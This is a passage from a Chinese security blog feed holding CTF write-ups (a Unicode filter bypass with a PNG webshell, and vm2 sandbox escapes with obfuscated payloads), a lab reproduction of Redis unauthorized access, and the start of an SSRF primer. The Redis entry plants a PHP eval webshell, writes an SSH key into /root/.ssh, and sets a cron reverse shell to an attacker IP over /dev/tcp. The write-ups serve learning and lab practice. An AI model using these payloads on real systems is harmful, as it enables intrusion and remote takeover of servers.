stristr($fileName,&quot;ph&quot;)) &#123;        die(&quot;有些东西让你传上去的话那可不得了&quot;);    &#125;    $imagePath = &quot;image/&quot; . mb_strtolower($fileName);    if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) &#123;        echo &quot;upload success, image at $imagePath&quot;;    &#125; else &#123;        die(&quot;传都没有传上去&quot;);    &#125;&#125;</code></pre><p>审计下这个代码，传一个文件，校验大小–&gt;校验图片高和宽–&gt;过滤’c’,’i’,’h’,’ph’–&gt;成功上传or失败</p><p>无法上传php🐎，无法利用.htacess和.user.ini，</p><p>那就</p><p>扫描一下目录，又发现了一个源码</p><p>example.php</p><pre><code class="php"> &lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;poc&quot;) &#123;    $zip = new \ZipArchive();    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123;        die(&quot;要不咱们再看看？&quot;);    &#125;    if ($zip-&gt;open($name_for_zip) !== TRUE) &#123;        die (&quot;都不能解压呢&quot;);    &#125;    echo &quot;可以解压，我想想存哪里&quot;;    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);    $zip-&gt;extractTo($pos_for_zip);    $zip-&gt;close();    unlink($name_for_zip);    $files = glob(&quot;$pos_for_zip/*&quot;);    foreach($files as $file)&#123;        if (is_dir($file)) &#123;            continue;        &#125;        $first = imagecreatefrompng($file);        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [&#39;x&#39; =&gt; 0, &#39;y&#39; =&gt; 0, &#39;width&#39; =&gt; $size, &#39;height&#39; =&gt; $size]);        if ($second !== FALSE) &#123;            $final_name = pathinfo($file)[&quot;basename&quot;];            imagepng($second, &#39;example/&#39;.$final_name);            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);    &#125;&#125;</code></pre><p>这段代码的大致作用是解压一个zip文件，那我们就要思考是否可以把php放入zip中，那就需要我们上传一个zip文件，但是i被过滤</p><p>这里可以利用mb_strtolower函数绕过，它是支持Unicode的</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123323158.png" alt="image-20220519123323158"></p><p>大致的意思就是我们可以用一个字符Unicode去替换i</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123635184.png" alt="image-20220519123635184"></p><pre><code class="php">&lt;?phpvar_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);?&gt;</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123728624.png" alt="image-20220519123728624"></p><p>详见:<a href="https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/">https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/</a></p><p>绕过了i之后我们还要绕过高和宽</p><p>我们可以利用xmb绕过</p><pre><code>#define test_width 1#define test_height 1</code></pre><p>除此之外它还有一个函数过滤，阻止我们在图片中放入恶意的php</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519124806416.png" alt="image-20220519124806416"></p><p>通常，系统在实现图片上传功能时，为了防范用户上传含有恶意 php 代码的图片，可采用 gd 库重建图片，gd 库重建图片的一系列函数 imagecreatefrom*，会检查图片规范，验证图片合法性，以此抵御图片中含有恶意 php 代码的攻击。</p><p>如果直接在图片最后写一个一句话木马，会被GD库给去掉。绕过GD库可以参考这篇文章：<a href="http://www.vuln.cn/6411">http://www.vuln.cn/6411</a></p><p>我们可以使用工具:<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator%E6%9D%A5%E5%B8%AE%E5%8A%A9%E6%88%91%E4%BB%AC%E7%BB%95%E8%BF%87">https://github.com/huntergregal/PNG-IDAT-Payload-Generator来帮助我们绕过</a></p><p>使用脚本生成图片🐎</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125046671.png" alt="image-20220519125046671"></p><p>修改后缀为php并放入zip中</p><p>创建一个txt文件，里面写入</p><pre><code>#define test_width 1#define test_height 1</code></pre><p>注:第一行要空出来换行，不然无法识别</p><p>然后将txt追加到zip后</p><pre><code>copy shell.zip/b+1.txt/a dd.zip</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130016829.png" alt="image-20220519130016829"></p><p>然后就可以来上传了</p><p>自己构建一个html post文件上传界面:</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://05b1ebab-02ca-4b72-bf12-1b21695d609d.node4.buuoj.cn:81/upload.php?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125541638.png" alt="image-20220519125541638"></p><p>抓包，修改i</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130133680.png" alt="image-20220519130133680"></p><p>成功上传</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130059694.png" alt="image-20220519130059694"></p><p>然后使用example页面解压</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519133936518.png" alt="image-20220519133936518"></p><p>成功解压，运行下</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134029090.png" alt="image-20220519134029090"></p><p>下面来找flag</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134213040.png" alt="image-20220519134213040"></p><p>读取下这个文件</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134241496.png" alt="image-20220519134241496"></p><h1 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h1><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519144418792.png" alt="image-20220519144418792"></p><p>真的是php吗？</p><p>既然这么提示了那肯定不是，测一下node.js</p><p>传入 Error().stack</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519145031732.png" alt="image-20220519145031732"></p><p>确实是js，是vm2的沙箱逃逸问题</p><p>github有现成poc:</p><pre><code class="js">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(untrusted));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>或者</p><pre><code class="js">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;    try&#123;        Buffer.from(new Proxy(&#123;&#125;, &#123;            getOwnPropertyDescriptor()&#123;                throw f=&gt;f.constructor(&quot;return process&quot;)();            &#125;        &#125;));    &#125;catch(e)&#123;        return e(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(untrusted));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>构造成function传入</p><pre><code class="js">(function() &#123;        &quot;use strict&quot;;    const &#123;VM&#125; = require(&#39;vm2&#39;);    const untrusted = &#39;(&#39; + function()&#123;        TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();        try&#123;            Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;        &#125;catch(e)&#123;            return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();        &#125;    &#125;+&#39;)()&#39;;    try&#123;        console.log(new VM().run(untrusted));    &#125;catch(x)&#123;        console.log(x);    &#125;&#125;)()</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519150121586.png" alt="image-20220519150121586"></p><p>应该关键字被过滤了</p><p>绕过:</p><p>1、在关键字字母上加上 `</p><pre><code class="js">(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+/flag`)[`toString`](); &#125; &#125;)()</code></pre><p>2、javascript的模版文字绕过</p><p>prototype变成`${`${`prototyp`}e`}`</p><pre><code class="js">(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();    &#125;&#125;)()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;唉，ciscn快开了，ctf太卷了，做做以前题练一下手吧&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;CISCN2021-Quals-upload&quot;&gt;&lt;a href=&quot;#CISCN2021-Quals-upload&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权访问漏洞复现</title>
    <link href="https://sakurahack-y.github.io/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-26T14:57:50.000Z</published>
    <updated>2022-04-30T16:56:39.911Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h1><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和  hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove  及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached  一样，为了保证效率，数据都是缓存在内存中。区别的是 redis  会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。</p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis  的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis  服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。目前比较主流的案例：yam2 minerd  挖矿程序，还有在多次应急事件中发现大量的watch-smartd挖矿木马。</p><h1 id="漏洞产生条件"><a href="#漏洞产生条件" class="headerlink" title="漏洞产生条件"></a>漏洞产生条件</h1><p>1、redis服务绑定在0.0.0.0:6379端口，而且信任了其他IP，导致了Redis服务暴露在公网上</p><p>2、没有设置密码认证，可以免密登陆Redis服务</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>1、导致敏感信息泄露，恶意执行flushall清空所有数据</p><p>2、通过Eval执行Lua代码，通过备份功能往磁盘写入后门文件</p><p>3、如果Redis服务以root身份运行，可以给root用户写入SSH公钥文件，直接通过SSH登陆服务器</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶机: centos7.5 阿里云 39.105.x.x    建议用centos</p><p>攻击机: kali2022 </p><p>redis 3.2.11</p><p>1.下载安装redis</p><pre><code>wget http://download.redis.io/releases/redis-3.2.11.tar.gz</code></pre><p>2.解压压缩包</p><pre><code>tar zxvf redis-3.2.11.tar.gz</code></pre><p>3.进入解压目录redis-3.2.11 执行make命令</p><pre><code>cd redis-3.2.11make</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426232909091.png" alt="image-20220426232909091"></p><p>4.进入src目录</p><pre><code>cd src</code></pre><p>5.将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</p><pre><code>cp redis-server /usr/bin/cp redis-cli /usr/bin/</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426233508159.png" alt="image-20220426233508159"></p><p>6.返回目录redis-3.2.11,将redis.conf拷贝到/etc/目录下</p><pre><code>cd ..cp redis.conf /etc/</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234155118.png" alt="image-20220426234155118"></p><p>7.使用/etc/目录下的redis.conf文件中的配置启动redis服务</p><pre><code>redis-server /etc/redis.conf</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234331895.png" alt="image-20220426234331895"></p><p>8.编辑etc中的redis配置文件redis.conf</p><pre><code>vim /etc/redis.conf</code></pre><p>去掉ip绑定，允许除本地外的主机远程登录redis服务 前面加#注释掉</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430165832466.png" alt="image-20220430165832466"></p><p>关闭保护模式，允许远程连接redis服务将yes 改为no</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426235216372.png" alt="image-20220426235216372"></p><p>最后重启下redis服务就ok</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先测试下目标靶机是否存在未授权访问</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430174535586.png" alt="image-20220430174535586"></p><p>成功连接上了，下面开始进一步利用</p><h2 id="1-写入webshell"><a href="#1-写入webshell" class="headerlink" title="1.写入webshell"></a><strong>1.写入webshell</strong></h2><p>写入一句话木马需要我们知道网站的根目录相对于服务器的绝对路径</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180627722.png" alt="image-20220430180627722"></p><pre><code>config set dir /www/wwwroot/39.105.71.63/config set dbfilename sakura.phpset webshell &quot;&lt;?php @eval($_POST[&#39;pass&#39;]) ?&gt;&quot;save</code></pre><p>我的网站上成功出现了这个文件</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180643451.png" alt="image-20220430180643451"></p><p>测试一下，可以成功连接</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430181012266.png" alt="image-20220430181012266"></p><h2 id="2-通过写入ssh公钥实现ssh登录"><a href="#2-通过写入ssh公钥实现ssh登录" class="headerlink" title="2.通过写入ssh公钥实现ssh登录"></a><strong>2.通过写入ssh公钥实现ssh登录</strong></h2><p>到这一步，我使用的阿里云服务器出了问题，就自己搭建个靶机(centos 7)吧.</p><p>记得关闭防火墙:</p><pre><code>sudo systemctl stop firewalld</code></pre><p>原理:在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key.</p><p>扩展:</p><p><strong>ssh免密登录流程:</strong></p><p>　　（1） 首先在客户端生成一对密钥（ssh-keygen）；</p><p>　　（2） 并将客户端的公钥ssh-copy-id 拷贝到服务端；</p><p>　　（3） 当客户端再次发送一个连接请求，包括ip、用户名；</p><p>　　（4） 服务端得到客户端的请求后，会到authorized_keys中查找，如果有响应的IP和用户，就会随机生成一个字符串，例如：qwer；</p><p>　　（5） 服务端将使用客户端拷贝过来的公钥进行加密，然后发送给客户端；</p><p>　　（6） 得到服务端发来的消息后，客户端会使用私钥进行解密，然后将解密后的字符串发送给服务端；</p><p>　　（7） 服务端接受到客户端发来的字符串后，跟之前的字符串进行对比，如果一致，就允许免密码登录。</p><p><strong>攻击流程:</strong></p><p><strong>1、首先在攻击机(kali)上生成ssh公钥</strong></p><pre><code>ssh-keygen -t rsa</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430191709018.png" alt="image-20220430191709018"></p><p><strong>2.将公钥写入key.txt文件（前后用\n换行，避免和redis里其他缓存数据混合）</strong></p><p> 进入.ssh目录：</p><pre><code>cd /root/.ssh</code></pre><p>写入文件：</p><pre><code>(echo -e”\n”;cat id_rsa.pub;echo -e “\n”)&gt;key.txt</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430192233869.png" alt="image-20220430192233869"></p><p><strong>3.将key.txt写靶机（使用redis-cli -h ip命令连接靶机，写入文件）</strong></p><pre><code>cat key.txt|redis-cli -h 192.168.0.106 -x set crack</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221009845.png" alt="image-20220430221009845"></p><p>4.远程登录靶机的Redis服务</p><pre><code>redis-cli -h 192.168.0.106</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221026832.png" alt="image-20220430221026832"></p><p>5.更改redis备份路径为ssh公钥存放目录(一般默认为/root/.ssh)</p><pre><code>config set dir /root/.ssh</code></pre><p>6.设置上传公钥的备份文件名字为authorized_keys</p><pre><code>config set dbfilename authorized_keysconfig get dbfilename</code></pre><p>7.保存</p><pre><code>save</code></pre><p>8.在攻击机上直接ssh免密登录靶机,免密登录成功</p><pre><code>ssh -i id_rsa root@192.168.0.106</code></pre><p>最后我没有成功，但大致思路是这样，一直不成功我就先不纠结了。</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1576831989_5dfc8bf50878a.png!small" alt="img"></p><h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a><strong>3.反弹shell</strong></h2><pre><code>redis-cli -h 192.168.0.106set shell &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.108/4444 0&gt;&amp;1\n\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220501003825941.png" alt="image-20220501003825941"></p><p>成功反弹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;redis介绍&quot;&gt;&lt;a href=&quot;#redis介绍&quot; class=&quot;headerlink&quot; title=&quot;redis介绍&quot;&gt;&lt;/a&gt;redis介绍&lt;/h1&gt;&lt;p&gt;Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="redis" scheme="https://sakurahack-y.github.io/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞总结</title>
    <link href="https://sakurahack-y.github.io/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2022-04-24T09:58:17.000Z</published>
    <updated>2022-05-02T14:16:07.407Z</updated>
    
    <content type="html"><![CDATA[<p>最近碰到了挺多SSRF题目的应用，以前学的太浅了，重新学习下，打好基础。</p><p>[TOC]</p><h1 id="SSRF漏洞简介"><a href="#SSRF漏洞简介" class="headerlink" title="SSRF漏洞简介"></a>SSRF漏洞简介</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。<br> 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）<br> <img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095630-ae7ee364-6d72-1.png" alt="img"></p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p> SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。<br> 如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用<code>存在缺陷的web应用作为代理</code>攻击远程和本地的服务器。</p><h2 id="漏洞易发生点"><a href="#漏洞易发生点" class="headerlink" title="漏洞易发生点"></a>漏洞易发生点</h2><ol><li>转码服务</li><li>在线翻译</li><li>图片加载与下载(通过URL地址加载或下载图片)</li><li>图片、文章收藏功能</li><li>网站采集、网页抓取的地方。</li><li>头像的地方。(远程加载头像)</li><li>一切要你输入网址的地方和可以输入ip的地方。</li><li>从URL关键字中寻找：<code>share</code>、<code>wap</code>、<code>url</code>、<code>link</code>、<code>src</code>、<code>source</code>、<code>target</code>、<code>u</code>、<code>3g</code>、<code>display</code>、<code>sourceURl</code>、<code>imageURL</code>、<code>domain</code><br> …</li></ol><h2 id="可以实现的攻击"><a href="#可以实现的攻击" class="headerlink" title="可以实现的攻击"></a>可以实现的攻击</h2><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<a href="https://www.cnblogs.com/yuanshu/p/11588341.html">banner 信息</a></li><li>攻击运行在内网或本地的应用程序</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li><li>下载内网资源(如：利用<code>file</code>协议读取本地文件等)</li><li>进行跳板</li><li>无视cdn</li><li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li></ol><h1 id="SSRF漏洞相关的函数和协议"><a href="#SSRF漏洞相关的函数和协议" class="headerlink" title="SSRF漏洞相关的函数和协议"></a>SSRF漏洞相关的函数和协议</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p><p>（1）file_get_contents()</p><pre><code class="php">&lt;?php$url = $_GET[&#39;url&#39;];;echo file_get_contents($url);?&gt;</code></pre><blockquote><p><code>file_get_content</code>函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p></blockquote><p>（2）fsockopen()</p><pre><code>&lt;?php function GetFile($host,$port,$link) &#123;     $fp = fsockopen($host, intval($port), $errno, $errstr, 30);       if (!$fp) &#123;         echo &quot;$errstr (error number $errno) \n&quot;;     &#125; else &#123;         $out = &quot;GET $link HTTP/1.1\r\n&quot;;         $out .= &quot;Host: $host\r\n&quot;;         $out .= &quot;Connection: Close\r\n\r\n&quot;;         $out .= &quot;\r\n&quot;;         fwrite($fp, $out);         $contents=&#39;&#39;;         while (!feof($fp)) &#123;             $contents.= fgets($fp, 1024);         &#125;         fclose($fp);         return $contents;     &#125; &#125;?&gt;</code></pre><blockquote><p><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p></blockquote><p>（3）curl_exec()</p><pre><code>&lt;?php if (isset($_POST[&#39;url&#39;]))&#123;    $link = $_POST[&#39;url&#39;];    $curlobj = curl_init();// 创建新的 cURL 资源    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源    $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;    file_put_contents($filename, $result);     echo $result;&#125;?&gt;</code></pre><blockquote><p><code>curl_exec</code>函数用于执行指定的cURL会话</p></blockquote><p><strong>注意</strong></p><pre><code>1.一般情况下PHP不会开启fopen的gopher wrapper2.file_get_contents的gopher协议不能URL编码3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用5.curl_exec() //默认不跟踪跳转，6.file_get_contents() // file_get_contents支持php://input协议</code></pre><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p> （1）<code>file</code>： 在有回显的情况下，利用 file 